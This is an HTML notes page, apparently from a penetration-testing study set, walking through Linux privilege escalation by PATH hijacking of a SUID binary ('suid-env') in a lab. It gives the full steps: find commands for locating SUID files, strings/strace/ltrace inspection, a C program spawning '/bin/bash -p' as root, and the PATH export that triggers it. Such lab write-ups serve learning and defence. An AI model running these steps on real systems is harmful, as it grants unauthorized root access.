<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PATH Environment Variable</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PATH Environment Variable</h1><br/>• The PATH environment variable contains a list of directories where the shell should try to find programs.<br />• If a <span style="color:#1e90ff;">program</span> tries to execute <span style="color:#ff8700;">another program</span>, <span style="text-decoration:underline;">but only specifies the </span><span style="color:#ff8700;text-decoration:underline;">program</span><span style="text-decoration:underline;"> name</span>, rather than its full (absolute) path, the shell will search the PATH directories until it is found.<br />   ◇ the name of that &quot;sub-<span style="color:#ff8700;">program</span>&quot; is likely embedded in the executable file of the <span style="color:#1e90ff;">principal program</span> as a string.<br />   ◇ We can run <span style="text-decoration:underline;">strings</span> on the executable file of the <span style="color:#1e90ff;">principal program</span> to find strings of characters that could be referring to a <span style="color:#ff8700;">another program</span><br />   ◇ We can also use <span style="text-decoration:underline;">strace</span> to see how the <span style="color:#1e90ff;">program</span> is executing. Another program called <span style="text-decoration:underline;">ltrace</span> may also be of use<br />• Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.<br /><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -type f -a <span style="color:#333333;font-weight:400">\(</span> -perm -u+s -o -perm -g+s <span style="color:#333333;font-weight:400">\)</span> -exec <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">{}</span> <span style="color:#333333;font-weight:400">\;</span> 2&gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/1308-1.png" alt="images/1308-1.png" /></a><br />    <a href=""><img src="images/1308-2.png" alt="images/1308-2.png" /></a><br />2. Run strings on the SUID file:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ strings <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env</pre></div><br />    <a href=""><img src="images/1308-3.png" alt="images/1308-3.png" /></a><br />    The <span style="color:#1e90ff;">program</span>(suid-env) could be trying to run the <span style="color:#ff8700;">service program</span> without a full path*. We have to verify that.<br />    *If it run with a full path like the below one:<br />    <a href=""><img src="images/1308-4.png" alt="images/1308-4.png" /></a><br />    see the next chapter <a href="_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--7._SUID-SGID_Executables--Abusing_Shell_Features_(define_user_functions).html">Abusing Shell Features (define user functions)</a><br />4. To run the <span style="color:#ff8700;">service</span> program, linux is searching on this directories<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ print <span style="color:#7f0044;font-weight:400">$PATH</span></pre></div><br />    <a href=""><img src="images/1308-5.png" alt="images/1308-5.png" /></a><br />5. We can verify this <br />   ◇ with <span style="text-decoration:underline;">strace</span>:<br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ strace -v -f -e execve <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> service</pre></div><br />       <a href=""><img src="images/1308-6.png" alt="images/1308-6.png" /></a><br />   ◇ with <span style="text-decoration:underline;">ltrace</span>:<br />        <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ ltrace <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> service</pre></div><br />        <a href=""><img src="images/1308-7.png" alt="images/1308-7.png" /></a><br />6. what we want to do is change the directory from where <span style="color:#ff8700;">service</span> is called from        <br />7. Create a <span style="color:#ff0000;">malicious service file</span> called “service.c” in the folder /tmp<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ vim service.c<br /><span style="color:#0088ff;font-weight:400"># i --&gt; insert</span><br /><span style="color:#0088ff;font-weight:400">#Esc --&gt; esc from insert</span><br /><span style="color:#0088ff;font-weight:400">#:w --&gt; write(save)</span><br /><span style="color:#0088ff;font-weight:400">#:q --&gt; exit</span></pre></div><br />    <div class="codebox"><pre>int <span style="color:#ffdd00;font-weight:400">main()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/bash -p&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />8. Compile service.c into a file called service:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">gcc</span> -o <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>service <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>service.c</pre></div><br />9. Prepend the /tmp directory (or where the <span style="color:#ff0000;">new malicious service executable</span> is located) to the PATH variable, and execute the <span style="color:#1e90ff;">SUID file</span> for a root shell:<br />     <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">PATH</span>=<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$PATH</span></pre></div><br />    <a href=""><img src="images/1308-8.png" alt="images/1308-8.png" /></a><br />10. Now we can run the SUID file that we have found at point 1 and become root<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env</pre></div><br /></div>
</body>
</html>
